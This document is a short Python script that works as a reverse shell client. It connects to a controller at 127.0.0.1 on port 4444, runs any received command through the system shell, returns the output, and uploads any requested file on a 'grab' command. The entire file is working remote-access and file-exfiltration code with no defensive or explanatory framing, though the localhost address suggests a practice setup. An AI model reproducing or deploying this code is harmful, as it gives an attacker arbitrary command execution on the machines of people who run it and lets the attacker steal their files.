import socket
import subprocess, os



IP = '127.0.0.1'
PORT = 4444

def transfer(s, path):
    if os.path.exists(path):
        f = open(path,'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
        f.close()
    else:
        s.send('NOT FOUND'.encode())

def connect():
    s = socket.socket()
    s.connect((IP,PORT))
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break # break while
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass

        else:
            c = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # stardart output
            s.send(c.stdout.read())
            s.send(c.stderr.read())


def main():
    connect()


if __name__ == "__main__":
    main()
